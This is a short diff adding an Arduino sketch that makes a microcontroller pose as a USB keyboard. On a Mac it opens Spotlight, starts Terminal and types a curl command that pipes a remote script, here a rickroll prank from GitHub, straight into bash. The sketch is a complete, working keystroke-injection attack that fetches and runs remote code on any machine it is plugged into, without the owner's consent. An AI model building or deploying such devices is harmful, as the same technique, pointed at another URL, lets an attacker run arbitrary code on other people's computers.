@@ -1,0 +1,39 @@
+
+
+#include "Keyboard.h"
+
+void typeKey(int key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+void setup()
+{
+  Keyboard.begin();
+
+  delay(500);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(' ');
+  Keyboard.releaseAll();
+
+  delay(400);
+
+  Keyboard.print("Terminal");
+
+  delay(300);
+
+  typeKey(KEY_RETURN);
+
+  delay(300);
+
+  Keyboard.print("curl -s -L https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh | bash");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.end();
+}
+
+void loop() {}
